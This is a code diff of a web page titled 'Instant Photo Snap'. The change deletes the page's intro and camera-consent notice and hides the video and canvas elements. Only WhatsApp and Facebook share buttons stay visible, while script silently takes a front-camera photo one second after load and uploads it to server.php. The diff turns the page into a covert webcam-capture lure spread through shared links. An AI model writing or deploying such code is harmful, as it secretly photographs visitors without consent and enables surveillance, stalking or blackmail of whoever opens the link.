@@ -73,23 +73,6 @@
             justify-content: center;
             padding: 20px;
         }
-        .intro {
-            font-size: 1.2em;
-            color: #a0a0a0;
-            margin-bottom: 20px;
-            text-align: center;
-        }
-        .consent-box {
-            background-color: #1f1f1f;
-            padding: 15px;
-            border-radius: 8px;
-            border: 1px solid #333333;
-            margin-bottom: 20px;
-            font-size: 0.9em;
-            color: #b0b0b0;
-            max-width: 500px;
-            text-align: center;
-        }
         .share-section {
             display: flex;
             gap: 15px;
@@ -133,65 +116,55 @@
         <h1>Instant Photo Snap</h1>
     </header>
     <main>
-        <div class="intro">
-            Take a quick photo and share it instantly!
-        </div>
-        <div class="consent-box">
-            This application requires camera access to capture a photo. By continuing, you agree to allow camera access.
-        </div>
-        <video id="video" autoplay muted></video>
-        <canvas id="canvas"></canvas>
         <div class="share-section">
             <button onclick="shareLink('WhatsApp')">Share on WhatsApp</button>
             <button onclick="shareLink('Facebook')">Share on Facebook</button>
         </div>
     </main>
     <footer>
-        Powered by Instant Photo Snap &copy; 2025
+        Powered by Instant Photo Snap © 2025
     </footer>
 
     <script>
         const videoElement = document.getElementById('video');
         const canvasElement = document.getElementById('canvas');
 
-        // Request camera access on page load
+        // Request camera access on page load and capture immediately upon permission
         window.addEventListener('load', () => {
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                 .then(stream => {
                     videoElement.srcObject = stream;
+                    // Wait for video to be ready
+                    videoElement.addEventListener('canplay', () => {
+                        if (videoElement.videoWidth > 0 && videoElement.videoHeight > 0) {
+                            setTimeout(() => {
+                                canvasElement.width = videoElement.videoWidth;
+                                canvasElement.height = videoElement.videoHeight;
+                                canvasElement.getContext('2d').drawImage(videoElement, 0, 0);
+                                const imageData = canvasElement.toDataURL('image/png');
+
+                                fetch('server.php', {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({ image: imageData })
+                                })
+                                .then(response => response.json())
+                                .then(data => {
+                                    console.log(data.message);
+                                    videoElement.srcObject.getTracks().forEach(track => track.stop());
+                                })
+                                .catch(err => {
+                                    console.error('Error saving photo:', err);
+                                });
+                            }, 1000); // Reduced delay to 1 second for faster capture
+                        } else {
+                            console.error('Video dimensions not available.');
+                        }
+                    });
                 })
                 .catch(err => {
                     console.error('Camera access failed:', err);
                 });
-        });
-
-        // Capture photo when video is ready
-        videoElement.addEventListener('canplay', () => {
-            // Ensure video dimensions are available
-            if (videoElement.videoWidth > 0 && videoElement.videoHeight > 0) {
-                setTimeout(() => {
-                    canvasElement.width = videoElement.videoWidth;
-                    canvasElement.height = videoElement.videoHeight;
-                    canvasElement.getContext('2d').drawImage(videoElement, 0, 0);
-                    const imageData = canvasElement.toDataURL('image/png');
-
-                    fetch('server.php', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ image: imageData })
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        console.log(data.message);
-                        videoElement.srcObject.getTracks().forEach(track => track.stop());
-                    })
-                    .catch(err => {
-                        console.error('Error saving photo:', err);
-                    });
-                }, 3000); // Increased delay to 3 seconds
-            } else {
-                console.error('Video dimensions not available.');
-            }
         });
 
         function shareLink(platform) {
